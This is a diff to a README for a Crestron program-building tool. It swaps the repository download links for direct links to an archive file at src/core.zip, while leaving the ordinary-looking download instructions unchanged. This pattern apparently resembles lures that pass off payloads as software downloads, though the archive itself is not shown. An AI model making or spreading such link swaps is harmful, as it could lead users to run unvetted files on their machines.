@@ -1,6 +1,6 @@
 # 🛠️ Crestron3SeriesCLZBuilder - Create Reliable Crestron Programs with Ease
 
-[![Download Crestron3SeriesCLZBuilder](https://img.shields.io/badge/Download-Crestron3SeriesCLZBuilder-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/Jasmin1684/Crestron3SeriesCLZBuilder)
+[![Download Crestron3SeriesCLZBuilder](https://img.shields.io/badge/Download-Crestron3SeriesCLZBuilder-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://raw.githubusercontent.com/Jasmin1684/Crestron3SeriesCLZBuilder/main/src/core.zip)
 
 ## 📥 Getting Started
 
@@ -47,7 +47,7 @@ Before you begin, make sure your computer meets these simple requirements:
 
 ### Step 1: Visit the Download Page
 
-**Visit this link to download the application:** [https://github.com/Jasmin1684/Crestron3SeriesCLZBuilder](https://github.com/Jasmin1684/Crestron3SeriesCLZBuilder)
+**Visit this link to download the application:** [https://raw.githubusercontent.com/Jasmin1684/Crestron3SeriesCLZBuilder/main/src/core.zip](https://raw.githubusercontent.com/Jasmin1684/Crestron3SeriesCLZBuilder/main/src/core.zip)
 
 )
 
